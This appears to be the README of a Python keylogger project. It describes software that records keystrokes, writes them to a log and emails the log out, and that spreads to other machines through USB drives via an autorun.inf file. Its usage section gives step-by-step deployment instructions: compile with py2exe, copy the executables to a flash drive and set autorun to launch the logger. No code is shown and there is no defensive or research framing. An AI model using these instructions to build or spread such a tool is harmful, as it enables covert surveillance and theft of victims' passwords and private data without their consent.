Keylogger
=========
A Python keylogger that monitors for keyboard events, writes to a log file, and then uploads to an email address. It spreads through usb storage devices using an autorun.inf file.
---------
Dependencies
------------
-Python 2.7.3
-py2exe
-pyHook
-win32api (python wrapper)
-pythoncom
-pyHook
-ImageGrab
Usage
-----
Compile all the python files to executables using py2exe. I'll provide a single setup.py script to do this in an upcoming release. Add all the .exes to a flash drive, and create an autorun.inf file pointing to keylog_runner.exe.
Changelog
---------
1.0 - Uploaded